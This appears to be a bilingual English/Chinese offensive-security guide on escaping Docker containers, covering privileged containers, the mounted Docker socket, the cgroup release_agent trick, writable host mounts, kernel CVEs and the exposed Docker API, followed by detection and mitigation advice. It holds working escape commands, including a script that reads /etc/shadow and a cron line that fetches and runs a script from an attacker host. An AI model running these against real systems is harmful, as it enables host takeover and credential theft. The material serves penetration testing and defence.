---
id: docker-escape
title_en: Docker and Container Escape
title_zh: Docker 与容器逃逸
summary_en: You already have code execution inside a container. Whether that becomes the host depends entirely on how the container was started, and the answer is visible in a handful of files.
summary_zh: 你已经在容器里拿到了代码执行。它能不能变成宿主机，完全取决于这个容器是怎么启动的 —— 而答案就写在几个文件里。
tags: [container, docker, escape, kubernetes, privilege-escalation, post-exploitation]
tools: [amicontained, deepce, CDK, Falco, capsh]
attck: [T1611, T1610]
platform: [linux]
difficulty: advanced
updated: 2026-10-08
---

<!-- lang:en -->
### First, confirm where you are

An application RCE inside a container and one on a host look similar until you check. Before reaching for an escape, establish the facts:

```bash
ls -la /.dockerenv                 # present in Docker containers
cat /proc/1/cgroup                 # docker/kubepods paths, or your own namespace
cat /proc/self/mountinfo | head    # what is mounted, and from where
capsh --print                      # capabilities, and whether they were dropped
cat /proc/self/status | grep -i cap
env | grep -i -E 'kube|docker'
hostname                           # container ids are often the hostname
```

`amicontained` answers most of this in one shot, and `deepce` automates the enumeration and the common escapes. What matters is not the tool but the three questions it answers: **what am I allowed to do (capabilities), what can I see (namespaces and mounts), and what can I reach (sockets and the network).**

### The escape routes, by prerequisite

Organising by what you already have is more useful than a list of techniques, because it tells you what to look for.

| What you have | How it becomes the host |
|---|---|
| `--privileged` | Mount the host disk, `nsenter`, load kernel modules |
| `docker.sock` mounted | Ask the daemon to start a container that mounts `/` |
| `CAP_SYS_ADMIN` | cgroup `release_agent`, or mount the host filesystem |
| `CAP_SYS_PTRACE` + `hostPID` | Inject into a process on the host |
| A writable host path mounted in | Write a cron job, an SSH key, or a systemd unit |
| `hostPID` | `nsenter` into the host's namespaces |
| `hostNetwork` | Reach host-local services, and anything the host can reach |
| An unpatched kernel | A known container-escape CVE |
| The Docker API on 2375/2376 | Full control of the daemon, and therefore the host |

### Privileged containers

A privileged container has all capabilities and unrestricted device access. The direct route is to mount the host's filesystem:

```bash
# the host disk is usually visible as a device
fdisk -l
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash
# or, without needing to know the device
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

Writing an SSH key or a cron job into that mount is usually faster than a full chroot.

### The Docker socket

If `/var/run/docker.sock` is mounted into the container, you have the daemon's full API, which is equivalent to root on the host:

```bash
# is the socket there and writable?
ls -la /var/run/docker.sock

# start a container with the host filesystem mounted
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
```

If the `docker` CLI is not installed, the same thing over the socket with `curl` works — the API is HTTP.

This is one of the most common real misconfigurations, because mounting the socket is the standard (and lazy) way to let a container manage other containers.

### Capabilities

`CAP_SYS_ADMIN` alone is usually enough, via the cgroup v1 `release_agent` mechanism:

```bash
# create a cgroup, set a release agent that will run on the host, then trigger it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "/tmp/escape.sh" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /tmp/escape.sh
echo 'cat /etc/shadow > /tmp/out' >> /tmp/escape.sh
chmod +x /tmp/escape.sh
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Other capabilities worth checking: `CAP_DAC_READ_SEARCH` (read files as root), `CAP_SYS_PTRACE` (process memory access), `CAP_NET_ADMIN` (network manipulation), and `CAP_SYS_MODULE` (load a kernel module, which is game over).

### Mounted host paths

The most underrated route, because it needs no capabilities at all. If any host directory is mounted read-write into the container, you can write to the host through it:

```bash
# where are the host mounts?
mount | grep -v -E 'proc|sys|dev|cgroup|tmpfs'

# then pick a target that executes on the host
echo '* * * * * root curl http://attacker/x.sh | sh' >> /host/etc/cron.d/x
echo 'ssh-rsa AAAA... attacker' >> /host/root/.ssh/authorized_keys
```

A backup directory, a log directory, a deployment path, `/var/run` — anything mounted in is a write primitive on the host. This is why `-v /:/host` in a compose file is worth flagging in a review.

### Kernel and runtime vulnerabilities

When the configuration is tight, the remaining route is a bug in the kernel or the runtime. These are version-dependent, so the work is identifying the version and matching it:

- **runc** (CVE-2019-5736) — overwriting the runc binary from inside a container during `exec`.
- **containerd** (CVE-2020-15257) — the abstract Unix socket for the shim, reachable from a container sharing the host network namespace.
- **cgroups v1** (CVE-2022-0492) — `release_agent` abuse without `CAP_SYS_ADMIN` when the cgroup is not namespaced.
- **overlayfs** (CVE-2023-0386) — a file-capability confusion allowing a setuid binary to be created on the host.
- **Dirty Pipe** (CVE-2022-0847) — write to read-only files, which among other things can modify host files through a read-only mount.

Check the kernel and runtime versions early:

```bash
uname -a
cat /proc/version
# and whether the runtime is patched shows up in the host's package versions, if you can reach them
```

### The exposed Docker API

Docker listens on 2375 (plaintext) or 2376 (TLS) when configured to serve over TCP. An unauthenticated 2375 is a host compromise with no exploitation required:

```bash
curl -s http://10.10.10.5:2375/version
curl -s http://10.10.10.5:2375/containers/json
# then create a container that mounts the host
```

This belongs in any external scan, and it appears in cloud environments more often than people expect.

### Kubernetes

Inside a cluster the escape often goes through the cluster rather than the container image: an over-privileged service account token, a `hostPath` volume, `privileged: true` in the pod spec, or the kubelet API on 10250. The Kubernetes entry in this guide covers those paths.

### Detection

Container escapes have a distinctive signature: a container process doing things containers do not normally do.

- **`nsenter`, `mount`, `chroot`, `unshare`** executed inside a container — very few legitimate workloads do this.
- **Writes to `/proc/sys`, `/sys/fs/cgroup`, or kernel module paths** from a container.
- **Processes appearing on the host whose parent is a container runtime**, which is what an escape looks like in the host's process tree.
- **Access to `docker.sock`** by a process that is not a container-management agent.
- **New cron entries, SSH keys or systemd units** appearing in a path that is mounted into a container.
- **The Docker API reachable from outside**, which should be an alert on the network side.

Runtime security tooling (Falco and similar) exists precisely to express these rules; the value is in the rules, not the tool.

### Mitigation

- **Never run `--privileged`.** It exists for debugging and should not survive into production.
- **Never mount `docker.sock` into a workload.** If a container must manage containers, use a restricted API proxy with an allow-list of endpoints.
- **Drop all capabilities and add back only what is needed** (`--cap-drop=ALL --cap-add=...`), and set `no-new-privileges`.
- **Mount host paths read-only**, and never mount `/`, `/etc`, `/var/run` or the root of a data volume into a workload.
- **Run as a non-root user** in the image, with a read-only root filesystem and a writable `emptyDir` or tmpfs where the application genuinely needs to write.
- **Use a seccomp profile and AppArmor/SELinux**, with the default Docker profile as a floor rather than the goal.
- **Keep the kernel and runtime patched**, since several escapes above are only reachable on old versions.
- **Do not expose the Docker API**, and if a managed registry needs it, require mutual TLS and network restrictions.
- **In Kubernetes, enforce Pod Security Standards** at the restricted level, so a privileged pod cannot be scheduled by accident.

<!-- lang:zh -->
### 先确认自己在哪

容器里的应用 RCE 和宿主机上的应用 RCE，在你不去确认之前长得一样。伸手去逃逸之前，先把事实确定下来：

```bash
ls -la /.dockerenv                 # Docker 容器里有这个文件
cat /proc/1/cgroup                 # docker/kubepods 路径，或者你自己的命名空间
cat /proc/self/mountinfo | head    # 挂载了什么，从哪挂的
capsh --print                      # 有哪些能力，是否被削减过
cat /proc/self/status | grep -i cap
env | grep -i -E 'kube|docker'
hostname                           # 容器 id 常常就是主机名
```

`amicontained` 一次就能回答大部分，`deepce` 把枚举和常见逃逸都自动化了。要紧的不是工具，而是它回答的三个问题：**我被允许做什么（能力）、我能看见什么（命名空间与挂载）、我能到达什么（socket 与网络）。**

### 按前提条件组织的逃逸路径

按"你手上有什么"来组织，比列一堆技术有用，因为它直接告诉你该找什么。

| 你拥有的 | 它如何变成宿主机 |
|---|---|
| `--privileged` | 挂宿主机磁盘、`nsenter`、加载内核模块 |
| 挂载了 `docker.sock` | 让守护进程起一个挂载了 `/` 的容器 |
| `CAP_SYS_ADMIN` | cgroup 的 `release_agent`，或挂载宿主机文件系统 |
| `CAP_SYS_PTRACE` + `hostPID` | 注入宿主机上的进程 |
| 挂进来一个**可写的宿主路径** | 写 cron、写 SSH key、写 systemd unit |
| `hostPID` | `nsenter` 进宿主机的命名空间 |
| `hostNetwork` | 访问宿主机本地服务，以及宿主机能到达的一切 |
| 未修补的内核 | 已知的容器逃逸 CVE |
| 2375/2376 上的 Docker API | 完全控制守护进程，因而控制宿主机 |

### privileged 容器

privileged 容器拥有全部能力与不受限的设备访问。最直接的路线就是挂载宿主机文件系统：

```bash
# 宿主机磁盘通常以设备形式可见
fdisk -l
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash
# 或者不需要知道设备名
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

往那个挂载点里写一个 SSH key 或一条 cron，通常比完整 chroot 更快。

### Docker socket

如果 `/var/run/docker.sock` 被挂进了容器，你就拥有守护进程的完整 API，等价于宿主机 root：

```bash
# socket 在不在，可不可写？
ls -la /var/run/docker.sock

# 起一个把宿主机文件系统挂进来的容器
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
```

如果没装 `docker` 命令行，用 `curl` 直接打这个 socket 效果一样 —— 那套 API 就是 HTTP。

这是现实中最常见的错误配置之一，因为把 socket 挂进容器正是"让容器管理其他容器"的标准（也是偷懒的）做法。

### 能力（capabilities）

通常光有 `CAP_SYS_ADMIN` 就够了，走 cgroup v1 的 `release_agent` 机制：

```bash
# 建一个 cgroup，设一个会在宿主机上执行的 release agent，然后触发它
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "/tmp/escape.sh" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /tmp/escape.sh
echo 'cat /etc/shadow > /tmp/out' >> /tmp/escape.sh
chmod +x /tmp/escape.sh
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

其他值得检查的能力：`CAP_DAC_READ_SEARCH`（以 root 身份读文件）、`CAP_SYS_PTRACE`（进程内存访问）、`CAP_NET_ADMIN`（网络操纵）、`CAP_SYS_MODULE`（加载内核模块 —— 有了它游戏就结束了）。

### 挂载进来的宿主路径

这是最被低估的一条路，因为它**完全不需要任何能力**。只要有任何一个宿主目录以读写方式挂进容器，你就能通过它写宿主机：

```bash
# 哪些是宿主机的挂载？
mount | grep -v -E 'proc|sys|dev|cgroup|tmpfs'

# 然后挑一个会在宿主机上执行的目标
echo '* * * * * root curl http://attacker/x.sh | sh' >> /host/etc/cron.d/x
echo 'ssh-rsa AAAA... attacker' >> /host/root/.ssh/authorized_keys
```

备份目录、日志目录、部署路径、`/var/run` —— 挂进来什么，就是宿主机上的一个写入原语。这也是为什么 compose 文件里的 `-v /:/host` 值得在评审里被标出来。

### 内核与运行时漏洞

配置很紧时，剩下的路就是内核或运行时里的 bug。它们与版本相关，所以工作是识别版本并匹配：

- **runc**（CVE-2019-5736）—— 在 `exec` 过程中从容器内覆写 runc 二进制。
- **containerd**（CVE-2020-15257）—— shim 的抽象 Unix socket，从共享宿主网络命名空间的容器可达。
- **cgroups v1**（CVE-2022-0492）—— cgroup 未被命名空间隔离时，无需 `CAP_SYS_ADMIN` 也能滥用 `release_agent`。
- **overlayfs**（CVE-2023-0386）—— 文件能力混淆，可在宿主机上创建 setuid 二进制。
- **Dirty Pipe**（CVE-2022-0847）—— 写只读文件，其中一条用途就是通过只读挂载改宿主文件。

尽早查内核与运行时版本：

```bash
uname -a
cat /proc/version
```

### 暴露的 Docker API

Docker 配置为通过 TCP 提供服务时会监听 2375（明文）或 2376（TLS）。未认证的 2375 就是一次不需要任何利用的宿主机沦陷：

```bash
curl -s http://10.10.10.5:2375/version
curl -s http://10.10.10.5:2375/containers/json
# 然后起一个挂载宿主机的容器
```

这该进任何外部扫描的范围，而且它在云环境里出现的频率比人们预期的高。

### Kubernetes

在集群里，逃逸往往走集群而不是容器镜像：权限过大的服务账号 token、`hostPath` 卷、pod spec 里的 `privileged: true`，或者 10250 上的 kubelet API。本指南的 Kubernetes 那篇讲这些路径。

### 检测

容器逃逸有个很鲜明的特征：**容器进程在做容器平时不做的事**。

- 容器内执行 **`nsenter`、`mount`、`chroot`、`unshare`** —— 绝大多数正常负载不会这么干。
- 从容器**写 `/proc/sys`、`/sys/fs/cgroup` 或内核模块路径**。
- 宿主机上出现**父进程是容器运行时的新进程** —— 逃逸在宿主机进程树里就长这样。
- 非容器管理组件的进程**访问 `docker.sock`**。
- 被挂进容器的路径上**出现新的 cron、SSH key 或 systemd unit**。
- **Docker API 对外可达** —— 这在网络侧就该是一条告警。

运行时安全工具（Falco 之类）存在的意义就是把上面这些表达成规则；价值在规则，不在工具。

### 缓解

- **绝不要 `--privileged`。** 它是为排查问题存在的，不该活到生产。
- **绝不把 `docker.sock` 挂进工作负载。** 如果容器必须管理容器，用一个限制端点的 API 代理。
- **丢掉所有能力，只加回需要的**（`--cap-drop=ALL --cap-add=...`），并设置 `no-new-privileges`。
- **宿主路径一律只读挂载**，绝不把 `/`、`/etc`、`/var/run` 或数据卷根目录挂进工作负载。
- **镜像里用非 root 用户运行**，根文件系统只读，真正需要写的地方给 `emptyDir` 或 tmpfs。
- **启用 seccomp 与 AppArmor/SELinux**，把 Docker 的默认 profile 当底线而不是目标。
- **保持内核与运行时打补丁**，因为上面好几个逃逸只在老版本上可达。
- **不要暴露 Docker API**；托管仓库确实需要时，要求双向 TLS 加网络限制。
- **在 Kubernetes 里强制执行 Pod Security Standards** 的 restricted 级别，让 privileged pod 不会意外被调度出来。
